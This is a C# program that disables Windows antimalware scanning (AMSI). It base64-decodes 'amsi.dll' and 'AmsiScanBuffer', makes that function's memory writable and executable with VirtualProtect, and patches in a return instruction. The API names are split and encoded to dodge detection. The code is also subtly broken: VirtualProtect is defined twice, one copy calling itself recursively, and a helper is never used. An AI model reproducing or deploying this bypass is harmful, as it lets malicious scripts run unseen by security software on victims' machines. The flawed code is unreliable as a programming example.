using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Text;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static string DecodeBase64(string encodedText)
    {
        byte[] bytes = Convert.FromBase64String(encodedText);
        string decodedText = Encoding.Unicode.GetString(bytes);
        return decodedText;
    }

    public static IntPtr LookupFunc(string moduleName, string functionName)
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
        Type nativeMethodsType = null;
        foreach (var assembly in assemblies)
        {
            if (assembly.GlobalAssemblyCache && assembly.Location.Split('\\')[^1].Equals("System.dll"))
            {
                nativeMethodsType = assembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
                break;
            }
        }

        if (nativeMethodsType == null)
        {
            throw new Exception("Failed to get UnsafeNativeMethods type from System.dll");
        }

        MethodInfo getModuleHandle = nativeMethodsType.GetMethod("GetModuleHandle", BindingFlags.NonPublic | BindingFlags.Static);
        MethodInfo getProcAddress = nativeMethodsType.GetMethod("GetProcAddress", BindingFlags.NonPublic | BindingFlags.Static);

        IntPtr moduleHandle = (IntPtr)getModuleHandle.Invoke(null, new object[] { moduleName });
        if (moduleHandle == IntPtr.Zero)
        {
            throw new Exception($"Failed to get module handle for {moduleName}");
        }

        IntPtr functionPtr = (IntPtr)getProcAddress.Invoke(null, new object[] { moduleHandle, functionName });
        if (functionPtr == IntPtr.Zero)
        {
            throw new Exception($"Failed to get address for function {functionName}");
        }

        return functionPtr;
    }

    static void Main(string[] args)
    {
        string e = "YQBtAHMAaQAuAGQAbABsAA==";
        string g = "QQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByAA==";

        string n = DecodeBase64(e);
        string p = DecodeBase64(g);

        uint oldProtection = 0;
        string c = "tect";
        IntPtr loadLibraryHandle = LoadLibrary(n);
        IntPtr procAddress = GetProcAddress(loadLibraryHandle, p);

        string replace = "VirtualPro";
        MethodInfo virtualProtectMethod = typeof(Program).GetMethod(replace + c, BindingFlags.Public | BindingFlags.Static);
        bool result = (bool)virtualProtectMethod.Invoke(null, new object[] { procAddress, (UIntPtr)5, 0x40, out oldProtection });

        byte[] shellcode = new byte[] { 0xc3, 0x90, 0x90 };
        Marshal.Copy(shellcode, 0, procAddress, shellcode.Length);
    }

    public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
    {
        return VirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);
    }
}

